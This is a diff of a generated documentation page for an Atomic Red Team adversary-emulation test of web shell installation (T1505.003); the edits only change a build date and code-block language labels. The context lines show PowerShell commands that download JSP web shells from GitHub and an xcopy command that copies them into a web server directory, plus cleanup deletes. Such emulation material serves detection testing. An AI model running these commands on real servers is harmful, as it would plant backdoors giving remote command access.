@@ -6,7 +6,7 @@ generated: "true"
 attack_technique_id: "T1505.003"
 attack_technique_name: "Server Software Component: Web Shell"
 source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1505.003/T1505.003.yaml"
-build_date: "2026-04-26 14:38:40"
+build_date: "2026-04-26 17:02:13"
 executor: "command_prompt"
 aliases:
   - "0a2ce662-1efa-496f-a472-2fe7b080db16"
@@ -59,13 +59,13 @@ Web shell must exist on disk at specified location (#{web_shells})
 
 ### Prerequisite Check
 
-```text
+```powershell
 if (Test-Path "#{web_shells}") {exit 0} else {exit 1}
 ```
 
 ### Get Prerequisite
 
-```text
+```powershell
 New-Item -Type Directory "#{web_shells}" -ErrorAction ignore | Out-Null
 Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1505.003/src/b.jsp" -OutFile "#{web_shells}/b.jsp"
 Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1505.003/src/tests.jsp" -OutFile "#{web_shells}/tests.jsp"
@@ -78,13 +78,13 @@ Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/ato
 
 ### Command
 
-```commandprompt
+```cmd
 xcopy /I /Y "#{web_shells}" #{web_shell_path}
 ```
 
 ### Cleanup
 
-```commandprompt
+```cmd
 del #{web_shell_path}\b.jsp /q >nul 2>&1
 del #{web_shell_path}\tests.jsp /q >nul 2>&1
 del #{web_shell_path}\cmd.aspx /q >nul 2>&1
